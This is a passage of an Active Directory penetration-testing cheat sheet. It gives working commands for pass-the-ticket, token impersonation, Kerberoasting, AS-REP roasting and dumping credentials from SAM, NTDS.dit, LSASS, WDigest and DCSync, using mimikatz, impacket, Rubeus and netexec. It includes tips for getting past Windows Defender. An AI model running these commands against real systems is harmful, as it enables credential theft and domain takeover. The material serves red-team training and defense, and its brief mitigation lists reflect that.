<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;ccache<span class="w"> </span>ticket<span class="w"> </span>path&gt;
nxc<span class="w"> </span>&lt;netexex<span class="w"> </span>module&gt;<span class="w"> </span>&lt;target&gt;<span class="w"> </span>--use-kcache<span class="w"> </span><span class="o">[</span>others<span class="w"> </span>module<span class="w"> </span>options...<span class="o">]</span>
</code></pre></div>
<p><strong>Note</strong>: <strong>when using pass-the-ticket, always use FQDN for targets!!!</strong></p>
<p>Perform a <strong>pass-the-key</strong> attack with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>sekurlsa::pth<span class="w"> </span>/user:&lt;user&gt;<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/&lt;key-algorithm&gt;:&lt;key&gt;<span class="w"> </span>/run:<span class="s2">"&lt;command&gt;"</span>
</code></pre></div>
<p>where <code>&lt;key-algorithm&gt;</code> is one of <code>rc4</code>, <code>aes128</code> or <code>aes256</code>. </p>
<h4 id="mitigations_4">Mitigations</h4>
<ul>
<li>Limit account re-use:<ul>
<li>Avoid re-using local admin password</li>
<li>Disable Guest and Administrator accounts</li>
<li>Limit who is a local administrator (least privilege)</li>
</ul>
</li>
<li>Utilise strong passwords:<ul>
<li>The longer the better (&gt;14 characters)</li>
<li>Avoid using common words</li>
<li>Also long sentences are good</li>
</ul>
</li>
<li>Privilege Access Management (PAM)<ul>
<li>Check out/in sensitive accounts when needed</li>
<li>Automatically rotate passwords on check out and check in</li>
<li>Limits pass attacks as hash/password is strong and constantly rotated</li>
</ul>
</li>
</ul>
<h3 id="token-impersonation_1">Token Impersonation</h3>
<p><strong>Tokens</strong> in Windows are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file, like "cookies" for computers.</p>
<p>There are two type of tokens:</p>
<ul>
<li><strong>Delegation Token</strong>: created when users interactively login into a system using their credentials, also remotely (RDP or VNC). </li>
<li><strong>Impersonation Token</strong>: created when users non-interactively login into a system, like accessing a shared drive on the network.</li>
</ul>
<p><strong>Token impersonation</strong> is a Windows post-exploitation technique that allows an attacker to steal the access token of a logged-on user on the system without knowing their credentials and impersonate them to perform operations with their privileges.</p>
<ul>
<li>The impersonation technique requires the attacker to gain local admin privileges on the compromised machine to steal its tokens.</li>
<li>An attacker can obtain <strong>domain admin privileges</strong> if a logged-on user is a <strong>domain administrator</strong>.</li>
</ul>
<h4 id="token-impersonation-metasploit">Token Impersonation: Metasploit</h4>
<p>In <code>metasploit</code>, load incognito module:</p>
<div class="highlight"><pre><span></span><code>load<span class="w"> </span>incognito
</code></pre></div>
<p>List tokens that is possible to impersonate:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># By username</span>
list_tokens<span class="w"> </span>-u

<span class="c1"># By Group</span>
list_tokens<span class="w"> </span>-g
</code></pre></div>
<p>Impersonate token:</p>
<div class="highlight"><pre><span></span><code>impersonate_token<span class="w"> </span>&lt;user<span class="p">|</span>group&gt;
</code></pre></div>
<p>*Note: double the slash to escape the slash.</p>
<p>Revert to starting user:</p>
<div class="highlight"><pre><span></span><code>rev2self
</code></pre></div>
<h4 id="token-impersonation-mimikatz">Token Impersonation: Mimikatz</h4>
<p>With mimikatz, check current token:</p>
<div class="highlight"><pre><span></span><code>token::whoami
</code></pre></div>
<p>List token available for being impersonated: </p>
<div class="highlight"><pre><span></span><code>token::list
</code></pre></div>
<p>Impersonate token:</p>
<div class="highlight"><pre><span></span><code>token::elevate /id:&lt;token id&gt;
</code></pre></div>
<p>Try impersonate <strong>NT AUTHORITY\SYSTEM</strong> account:</p>
<div class="highlight"><pre><span></span><code>token::elevate
</code></pre></div>
<p>References:</p>
<ul>
<li><a href="https://tools.thehacker.recipes/mimikatz/modules/token/elevate">TheHackerRecipes - Mimikatz - Elevate</a></li>
</ul>
<h4 id="mitigations_5">Mitigations</h4>
<ul>
<li>Mitigation Strategies:<ul>
<li>Limit user/group token creation permissions</li>
<li>Account tiering</li>
<li>Local admin restriction</li>
</ul>
</li>
</ul>
<h3 id="kerberoasting_1">Kerberoasting</h3>
<p><strong>Kerberoasting</strong> is a common AD attack to obtain Kerberos tickets that help with persistence. In order for this attack to work, the attacker must have access to <strong>SPN</strong>  accounts such as IIS User, MSSQL, etc. </p>
<ul>
<li>The Kerberoasting attack involves requesting a <strong>Ticket Granting Service (TGS)</strong> for a <strong>SPN (Service Principal Name)</strong> using a valid <strong>Ticket Granting Ticket (TGT)</strong> for a compromised domain account.<ul>
<li>Since the <strong>TGS</strong> is encrypted using the SPN's account hash, it's possible to try cracking it in order to obtain this service account's password.</li>
</ul>
</li>
</ul>
<p>Note: targeting machine accounts it's useless since those accounts passwords are generally auto-generated and pretty long, being often impossible to crack; instead, targeting service accounts could be successful since those accounts password may be more prone to cracking.</p>
<p>Having <code>GenericAll</code> or<code>GenericWrite</code> permission a user, allows to forcibly set a SPN for this user and later requesting a TGS in order to brute/force it offline.</p>
<ul>
<li>The SPN set can be anything - does not to have sense at all. <strong>It must just be unique in the domain</strong>!</li>
</ul>
<p><strong>Targeted Kerberoasting</strong>:  When a user  has a <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteProperty</code> or <code>Validated-SPN</code> over a target user, it's possible to abuse these rights on the target user by making it vulnerable to Kerberoasting.</p>
<ul>
<li>This is simply done by adding a temporary SPN, perform a classic Kerberoasting attack  and then remove the SPN.</li>
</ul>
<p>Find SPN account(s):</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetUser</span> <span class="n">-SPN</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">"$null"</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
</code></pre></div>
<p>Find a SPN  using impacket's <code>GetUserSPNs</code> script:</p>
<div class="highlight"><pre><span></span><code>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;

<span class="c1"># Secify the target domain instead of the DC IP; useful when target domain is different from the user domain (eg. Kerbersoating accross trusts)</span>
GetUserSPNs.py<span class="w"> </span>-target-domain<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request<span class="w"> </span>

<span class="c1"># Directly request for each found SPN the TGS (so skip next command)</span>
GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request<span class="w"> </span>
</code></pre></div>
<p>Find Kerberoastable users with <code>netexec</code>:</p>
<div class="highlight"><pre><span></span><code>netexec<span class="w"> </span>ldap<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--kerberoasting<span class="w"> </span>kerberoastables.txt
</code></pre></div>
<p>Request TGS for the specified SPN:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
<span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">"&lt;target SPN&gt;"</span>

<span class="c"># or with PowerView</span>
<span class="nb">Request-SPNTicket</span>
</code></pre></div>
<p>Request TGS for the found SPN's user using impacket's <code>GetUserSPNs</code>:</p>
<div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request-user<span class="w"> </span>&lt;SPN<span class="err">'</span>s<span class="w"> </span>user&gt;
</code></pre></div>
<p>Request TGS for all users on which current one as enough privileges using the Targeted Kerberoast technique with <a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast.py</a>:</p>
<div class="highlight"><pre><span></span><code>targetedKerberoast.py<span class="w"> </span>-d<span class="w"> </span><span class="s1">'&lt;domain&gt;'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;owned user&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span>
</code></pre></div>
<p>List tickets in memory:</p>
<div class="highlight"><pre><span></span><code>klist
</code></pre></div>
<p>Export all tickets using Mimikatz:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"kerberos::list /export"'</span>
</code></pre></div>
<p>Alternatively, request and dump TGSs for every kerberoastable users (only service accounts):</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe kerberoast
</code></pre></div>
<p>Convert kirbi tickets to hashcat/john crackable format with <a href="https://github.com/nidem/kerberoast">kirby2john</a>:</p>
<div class="highlight"><pre><span></span><code>kirby2john<span class="w"> </span>&lt;kirbi<span class="w"> </span>ticket&gt;
</code></pre></div>
<p>Convert kirbi tickets to ccache format with Impacket's <code>ticketConverter</code>:</p>
<div class="highlight"><pre><span></span><code>ticketConverter.py<span class="w"> </span>kirbi_ticket.kirbi<span class="w"> </span>ccache_ticket.ccache
</code></pre></div>
<p>Try cracking the obtained TGS by using hascat:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>&lt;other<span class="w"> </span>options&gt;<span class="w"> </span>&lt;<span class="nb">hash</span><span class="w"> </span>file&gt;<span class="w"> </span>&lt;wordlist&gt;
</code></pre></div>
<p>Force setting a SPN for a user (must be unique in the domain):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">support1user</span> <span class="n">-Set</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">'&lt;target SPN&gt;'</span><span class="p">}</span>
</code></pre></div>
<h4 id="mitigations_6">Mitigations</h4>
<ul>
<li>Use strong password for Service Accounts.</li>
<li>Use Managed Service Accounts which provides automatic password management, simplified service principal name (SPN) management, and the ability to delegate the management to other administrators.</li>
</ul>
<h3 id="as-rep-roasting_1">AS-REP Roasting</h3>
<p>This attack it's possible when there's a user account with Kerberos pre-authentication disabled i.e "Do not require Kerberos preauthentication" enabled in UserAccountControl (UAC) settings.</p>
<ul>
<li>When pre-authentication is disabled, an attacker can request a ticket for a specific user (<em>AS-REQ</em>) without the need to prove its identity to the AS.</li>
<li>The returned response, the <strong>AS-REP</strong> will contain a part which is encrypted with the requesting user hash (see <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#kerberos-authentication">Kerberos Authentication</a>). </li>
<li>The <strong>AS-REP Roasting</strong> attack consists into brute-forcing offline this encrypted part in order to obtain the targeted user password.</li>
</ul>
<p>Having <code>GenericAll</code> or <code>GenericWrite</code> permission a user, allows to forcibly disable the Kerberos pre-authentication for this user.</p>
<p>Enumerate accounts with Kerberos pre-authentication disabled:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Powerview</span>
<span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="n">-Verbose</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span>
</code></pre></div>
<p>Enumerate accounts  with Kerberos pre-authentication disabled and dump TGS with Impacket's <code>GetNPUsers</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Without password</span>
impacket-GetNPUsers<span class="w"> </span>-no-pass<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;
impacket-GetNPUsers<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>&lt;list<span class="w"> </span>of<span class="w"> </span>users&gt;<span class="w"> </span>&lt;domain&gt;/<span class="w"> </span>

<span class="c1"># With password</span>
GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;

GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>-usersfile<span class="w"> </span>&lt;list<span class="w"> </span>of<span class="w"> </span>users&gt;<span class="w"> </span>&lt;domain&gt;/<span class="w"> </span>
</code></pre></div>
<p>Force disabling Kerberos pre-authentication for a user on which the attacker's controlled user has <code>GenericAll</code> or <code>GenericWrite</code> permissions:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">Control1User</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Request TGS for vulnerable users:</p>
<div class="highlight"><pre><span></span><code>#<span class="w"> </span><span class="k">For</span><span class="w"> </span><span class="nv">every</span><span class="w"> </span><span class="nv">vulnerable</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">current</span><span class="w"> </span><span class="nv">domain</span>
<span class="nv">Rubeus</span>.<span class="nv">exe</span><span class="w"> </span><span class="nv">asreproast</span><span class="w"> </span><span class="o">/</span><span class="nv">nowrap</span>

#<span class="w"> </span><span class="k">For</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">specific</span><span class="w"> </span><span class="nv">user</span>
<span class="nv">Rubeus</span>.<span class="nv">exe</span><span class="w"> </span><span class="nv">asreproast</span><span class="w"> </span><span class="o">/</span><span class="nv">user</span>:<span class="o">&lt;</span><span class="nv">target</span><span class="w"> </span><span class="nv">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nv">nowrap</span>
</code></pre></div>
<p>Crack ticket with hashcat:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>&lt;ticket&gt;<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>
<h3 id="dumping-credentials">Dumping Credentials</h3>
<p>Mimikatz is a tool used to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, build Golden tickets, Silver Ticket, etc.</p>
<p>It comes with various modules:</p>
<ul>
<li><strong>sekurlsa</strong>: This module extracts <strong>passwords</strong>, <strong>keys</strong>, <strong>pin codes</strong>, <strong>tickets</strong> from the memory of <code>lsass</code> (<code>Local Security Authority Subsystem Service</code>)</li>
<li><strong>kerberos</strong>: This module can be used without any privilege. It permits to create offline 'Golden tickets' (TGT).</li>
<li><strong>lsadump</strong>: This module can be used to dump credentials from LSA* and SAM database or to decrypt secrets into registry.</li>
<li>Many others</li>
</ul>
<p>*Note: <strong>Local Security Authority (LSA)</strong> is the Windows component responsible for the authentication and privileges management for users accessing to a system resource. It manages credentials such as usernames and passwords and regulates the access to resources such as files, folders, printers, networks, etc.</p>
<p>Every user that has logged to a server has its credentials stored in memory: mimikatz allows to dump these credentials hashes from memory.</p>
<ul>
<li>The hashes can be relayed or cracked.</li>
</ul>
<p>If <strong>WDigest</strong> authentication is enabled, the password will be plaintext stored in memory:</p>
<ul>
<li>Until Windows 7, this authentication was enabled by default. From Windows 8 it has been disabled  but it's still present.</li>
</ul>
<p>An attacker that controls a compromised server could enable the WDigest authentication and then wait for user to logon in order to dump their plaintext password with mimikatz.</p>
<p>Mimikatz exe would be almost certainly blocked by Windows Defender; by using PowerSploit <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz.ps1</a> it's possible to execute mimikatz into memory, helping with bypassing Defender and Real Time Monitoring.</p>
<ul>
<li>Invoke-Mimikatz reflectively loads Mimikatz in memory using PowerShell. Can be used for any functionality provided with Mimikatz without writing anything to disk.</li>
</ul>
<p>It's possible, during enumeration and lateral movement, to encounter some <strong>.keytab</strong> Kerberos files:</p>
<ul>
<li>a <strong>keytab</strong> (short for &ldquo;key table&rdquo;) stores long-term keys for one or more principals. It's generally used with tools and scripts to authenticate against Kerberos without having to provide credentials each time.</li>
<li>It's possible to recover from a keytab the NTLM hash of the associated principals.</li>
</ul>
<p>See <a href="https://github.com/gentilkiwi/mimikatz/wiki">Mimikatz Wiki</a> and <a href="https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz">Mimikatz HackTricks</a>  for more information about mimikatz usage and capabilities.</p>
<p>Dump credentials and other secrets (cookies, certificates, etc.) remotely with <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a>:</p>
<div class="highlight"><pre><span></span><code>donpapi<span class="w"> </span>collect<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-t<span class="w"> </span>&lt;target&gt;
</code></pre></div>
<p>Dump credentials and other secrets with <code>Invoke-Mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Dump credentials on a local machine.</span>
<span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span>

<span class="c"># Dump credentials on multiple remote machines</span>
<span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">computers</span> <span class="n">list</span><span class="p">&gt;</span> <span class="c"># Uses Invoke-Command</span>
</code></pre></div>
<h4 id="dumping-credentials-sam">Dumping Credentials - SAM</h4>
<p>Exfiltrate SAM and SYSTEM registry hive (needed to decrypt the SAM database) from registries:</p>
<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>save<span class="w"> </span>HKLM<span class="se">\s</span>am<span class="w"> </span>&lt;output<span class="w"> </span>path&gt;
reg<span class="w"> </span>save<span class="w"> </span>HKLM<span class="se">\s</span>ystem<span class="w"> </span>&lt;output<span class="w"> </span>path&gt;
</code></pre></div>
<p>Decrypt the SAM database with Impacket's <code>secretsdump</code>:</p>
<div class="highlight"><pre><span></span><code>secretsdump<span class="w"> </span>-sam<span class="w"> </span>sam<span class="w"> </span>-system<span class="w"> </span>system<span class="w"> </span>LOCAL
</code></pre></div>
<p>Dump SAM database on pwned targets with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Deprecated - Use netexec instead</span>
crackmapex<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--sam

<span class="c1"># Using netexec</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--sam
</code></pre></div>
<p>Try dumping SAM database (doesn't always work) with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>lsadump::sam

<span class="c1"># if previous command returned an error try</span>
lsadump::sam<span class="w"> </span>/patch
</code></pre></div>
<h4 id="dumping-credentials-ntds">Dumping Credentials - NTDS</h4>
<p>Exfiltrate NTDS.dit and SYSTEM and SECURITY (optionally) registry hives (needed to decrypt the NTDS.dit) with <code>vssadmin</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Create shadow copy volume</span>
vssadmin<span class="w"> </span>create<span class="w"> </span>shadow<span class="w"> </span>/for<span class="o">=</span>C:

<span class="c1"># Or</span>
wmic<span class="w"> </span>shadowcopy<span class="w"> </span>call<span class="w"> </span>create<span class="w"> </span><span class="nv">Volume</span><span class="o">=</span>C:<span class="se">\</span>


<span class="c1"># Copy files from shadow volume</span>
copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\N</span>TDS.dit<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>tds.dit.save
copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\s</span>ystem.save
<span class="o">[</span>copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>ECURITY<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\s</span>ecurity.save<span class="o">]</span>

<span class="c1"># Delete shadow copy volume</span>
vssadmin<span class="w"> </span>delete<span class="w"> </span>shadows<span class="w"> </span>/shadow<span class="o">=</span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>id&gt;
</code></pre></div>
<p>Note: using cmd instead of PowerShell <em>might</em> work better (I've experienced some issues with PS).</p>
<p>xfiltrate NTDS.dit and SYSTEM and SECURITY (optionally) registry hives (needed to decrypt the NTDS.dit) with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a> (stealthier than <code>vssadmin</code>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\NTDS\NTDS.dit"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\ntds.dit.save"</span>
<span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\System32\config\SYSTEM"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\system.save"</span>
<span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\System32\config\SECURITY"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\security.save"</span>
</code></pre></div>
<p>If the "AmbiguousMatchException" is raised, try to patch the <code>Invoke-NinjaCopy.ps1</code> script as follows:</p>
<ul>
<li>Change the following line (910):   <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code></li>
<li>To: <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</code></li>
</ul>
<p>Extract the NTDS.dit and the SYSTEM registry hive with <code>ntdsutil</code>:</p>
<div class="highlight"><pre><span></span><code>ntdsutil.exe<span class="w"> </span><span class="s1">'ac i ntds'</span><span class="w"> </span><span class="s1">'ifm'</span><span class="w"> </span><span class="s1">'create full c:\temp'</span><span class="w"> </span>q<span class="w"> </span>q
</code></pre></div>
<p>Parse and decrypt NTDS.dit with Impacket's <code>secretsdump</code>:</p>
<div class="highlight"><pre><span></span><code>secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit.save<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span><span class="o">[</span>-security<span class="w"> </span>security.save<span class="o">]</span><span class="w"> </span>LOCAL
</code></pre></div>
<p><strong>Note 1</strong>: for large NTDS.dit consider using <a href="https://github.com/c-sto/gosecretsdump">gosecretsdump</a> (faster).
<strong>Note 2</strong>: having the SECURITY registry hive allows to obtain the machine account NTLM hash. </p>
<p>Convert NTDS.dit to sqlite database:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Without SYSTEM registry hive</span>
ntdsdotsqlite<span class="w"> </span>ntds.dit.save<span class="w"> </span>-o<span class="w"> </span>ntds.sqlite

<span class="c1"># With SYSTEM registry hive</span>
ntdsdotsqlite<span class="w"> </span>ntds.dit.save<span class="w"> </span>-o<span class="w"> </span>ntds.sqlite<span class="w"> </span>--system<span class="w"> </span>system.save
</code></pre></div>
<h4 id="dumping-credentials-lsass">Dumping Credentials - LSASS</h4>
<p>Dump lsass process from memory (GUI):</p>
<ol>
<li>Open Task Manager</li>
<li>Right click on lsass.exe</li>
<li>Create dump file</li>
</ol>
<p>Dump lsass process from memory using ProcDump from SysInternals Suit:</p>
<div class="highlight"><pre><span></span><code>procdump.exe<span class="w"> </span>-accepteula<span class="w"> </span>-ma<span class="w"> </span>lsass.exe<span class="w"> </span>&lt;output<span class="w"> </span>path&gt;
</code></pre></div>
<p>Dump lsass with <code>netexec</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Using netexec</span>
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--lsa
</code></pre></div>
<p>Try dumping credentials from LSA (lsass.exe) process with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>lsadump::lsa<span class="w"> </span>/patch
</code></pre></div>
<h4 id="dumping-credentials-secrets">Dumping Credentials - Secrets</h4>
<p>Dump all available credentials with impacket's <code>secretdump.py</code> script:</p>
<div class="highlight"><pre><span></span><code>secretdump.py<span class="w"> </span><span class="o">[[</span>domain/<span class="o">]</span>username<span class="o">[</span>:password<span class="o">]</span>@<span class="o">]</span>&lt;targetName<span class="w"> </span>or<span class="w"> </span>address&gt;
</code></pre></div>
<p>Dumping secrets from registry hive with mimikatz:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Must return "Privilege '20' OK" </span>
privilege::debug
lsadump::secrets
</code></pre></div>
<p>Dumping credentials with mimikatz:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Must return "Privilege '20' OK" </span>
privilege::debug

sekurlsa::logonpasswords
</code></pre></div>
<h4 id="dumping-credentials-wdigest">Dumping Credentials - WDigest</h4>
<p>Enable WDigest authentication on a compromised server:</p>
<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span>HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\S</span>ecurityProviders<span class="se">\W</span>Digest<span class="w"> </span>/v<span class="w"> </span>UseLogonCredential<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="m">1</span>
</code></pre></div>
<p>Dump Wdigest passwords:</p>
<div class="highlight"><pre><span></span><code>sekurlsa::wdigest
</code></pre></div>
<h4 id="dumping-credentials-dcsync">Dumping Credentials - DCSync</h4>
<p>A large organization can require multiple Domain Controllers:</p>
<ul>
<li>Each domain controller runs a process called the <strong>Knowledge Consistency Checker (KCC)</strong>. </li>
<li>The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information.</li>
</ul>
<p>The process of replication is called <strong>DC Synchronisation</strong> (or <strong>DC Sync</strong>):</p>
<ul>
<li>Domain Admins can perform a DC Sync.</li>
</ul>
<p><strong>The attack</strong>: DC Sync can be used to harvest credentials from other DCs.</p>
<p>Dump NTLM hashes with DCSync (Domain Admin privileges required):</p>
<div class="highlight"><pre><span></span><code>lsadump::dcsync
</code></pre></div>
<p>Dump trust account's hashes (<em>trust keys</em>)(Domain Admin privileges required):</p>
<div class="highlight"><pre><span></span><code>lsadump::trust<span class="w"> </span>/patch

<span class="c1"># or</span>
lsadump::dcsync<span class="w"> </span>/user:&lt;trusted<span class="w"> </span>domain<span class="w"> </span>service<span class="w"> </span>account&gt;$
</code></pre></div>
<p><strong>Note</strong> - <strong>a user has DCSync privileges when it has the following permissions on  the Domain object</strong>:</p>
<ul>
<li>Replicating Directory Changes</li>
<li>Replicating Directory Changes All</li>
<li>Replicating Directory Changes In Filtered Set</li>
</ul>
<h4 id="dumping-credentials-kerberos-tickets-and-keys">Dumping Credentials - Kerberos Tickets and Keys</h4>
<p>Dump Kerberos tickets belonging to all authenticated users on the target server:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># List</span>
sekurlsa::tickets

<span class="c1"># Export to file</span>
sekurlsa::tickets<span class="w"> </span>/export
</code></pre></div>
<p>Dump Kerberos encryption keys from memory by using <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>sekurlsa::ekeys
</code></pre></div>
